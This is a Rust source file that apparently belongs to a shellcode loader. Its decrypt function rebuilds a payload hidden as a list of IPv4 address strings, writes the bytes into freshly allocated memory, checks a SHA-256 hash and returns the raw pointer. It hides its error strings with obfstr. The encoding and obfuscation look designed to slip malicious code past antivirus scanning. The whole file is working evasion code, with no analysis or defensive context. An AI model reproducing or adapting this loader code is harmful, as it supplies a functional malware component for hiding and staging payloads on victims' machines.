use crate::alloc_mem::alloc_mem;

pub unsafe fn decrypt(decoded: &[u8]) -> Result<(usize, usize), String> {
    use sha2::{Sha256, Digest};
    use obfstr::obfstr;
    let hash_len = 32;
    let len_len = 4;
    if decoded.len() < hash_len + len_len {
        return Err(obfstr!("ipv4 payload too short").to_string());
    }
    let hash = &decoded[0..hash_len];
    let len_bytes = &decoded[hash_len..hash_len + len_len];
    let original_len = u32::from_le_bytes([len_bytes[0], len_bytes[1], len_bytes[2], len_bytes[3]]) as usize;
    let addresses_str = std::str::from_utf8(&decoded[hash_len + len_len..]).map_err(|_| obfstr!("invalid utf8").to_string())?;
    let addresses: Vec<&str> = addresses_str.split(',').collect();
    let p = unsafe { alloc_mem(original_len)? };
    let buf = std::slice::from_raw_parts_mut(p, original_len);
    let mut idx = 0;
    'outer: for addr_str in addresses {
        let parts = addr_str.split('.').collect::<Vec<&str>>();
        if parts.len() != 4 { return Err(obfstr!("Invalid IPv4 address").to_string()); }
        for p in parts {
            if idx >= original_len { break 'outer; }
            let b: u8 = p.parse().map_err(|_| obfstr!("Invalid IPv4 byte").to_string())?;
            buf[idx] = b;
            idx += 1;
        }
    }
    let mut hasher = Sha256::new();
    hasher.update(&buf[..original_len]);
    let calc_hash = hasher.finalize();
    if hash != calc_hash.as_slice() {
        return Err(obfstr!("ipv4 hash mismatch").to_string());
    }
    Ok((p as usize, original_len))
}